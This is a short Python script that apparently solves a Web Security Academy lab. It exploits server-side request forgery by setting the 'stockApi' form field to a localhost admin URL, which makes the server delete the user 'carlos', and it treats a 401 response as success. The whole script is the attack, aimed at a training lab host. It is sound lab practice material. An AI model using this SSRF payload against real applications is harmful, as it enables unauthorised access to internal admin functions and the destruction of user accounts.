import requests

def main():
    data = {
        "stockApi": "http://localhost/admin/delete?username=carlos"
    }
    r = requests.post('https://acaa1fbd1fb08358c02b2290004300bb.web-security-academy.net/product/stock', data=data)
    
    # The end status code was 401 as it redirected to the /admin page
    if r.status_code == 401:
        print("[+] Success - User has been deleted")

if __name__ == '__main__':
    main()